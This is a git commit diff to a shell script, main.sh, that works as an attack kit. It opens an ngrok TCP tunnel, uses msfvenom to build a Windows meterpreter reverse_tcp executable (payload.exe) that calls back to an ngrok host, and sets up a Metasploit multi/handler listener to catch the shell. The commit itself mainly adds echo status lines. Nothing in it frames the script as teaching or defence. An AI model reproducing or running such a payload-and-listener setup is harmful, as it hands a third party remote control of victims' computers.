f4af130fb90ee24aab0e8117d23ea44de049e9c7
Crazedpotato <92868941+THECRAZEDPOTATTO@users.noreply.github.com>
2022-05-24 13:51:16 -0400

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,5 +1,11 @@
+echo "Setting up ngrok";
 ./ngrok tcp 9999
+echo "Done";
+echo "Building shell";
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f exe > payload.exe
+echo "Done";
+echo "Setting up listener"
+echo "Done"
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
